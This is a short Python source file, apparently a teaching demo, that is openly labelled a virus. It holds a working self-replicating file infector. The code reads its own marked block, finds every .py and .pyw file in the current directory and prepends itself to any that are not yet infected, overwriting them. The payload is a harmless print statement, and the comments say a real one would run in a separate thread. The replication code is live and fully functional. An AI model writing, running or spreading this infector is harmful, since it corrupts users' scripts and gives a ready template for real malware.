### start of the virus ###

import sys, glob


code = []
# dynamically get the file names
# sys.argv[0] is the file name that the current script has
with open(sys.argv[0], 'r') as sys_file:
    lines = sys_file.readlines()

# define the area
virus_area = False
for line in lines:
    if line == '### start of the virus ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### end of the virus ###\n':
        break

# find the python scripts that are in the current directory
python_script = glob.glob('*.py') + glob.glob('*.pyw')

# self-replicating part
for script in python_script:
    with open(script, 'r') as script_file:
        script_code = script_file.readlines()

    infected = False
    for line in script_code:
        if line == '### start of the virus ###\n':
            infected = True
            break
    
    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)
        
        with open(script, 'w') as f:
            f.writelines(final_code)

# malicious code part(payload)
# the actual virus should open a new thread and run the functionality there
# otherwise it would block the original codes
print("This is not a virus.")

### end of the virus ###

# the original codes that are running in the background, for example
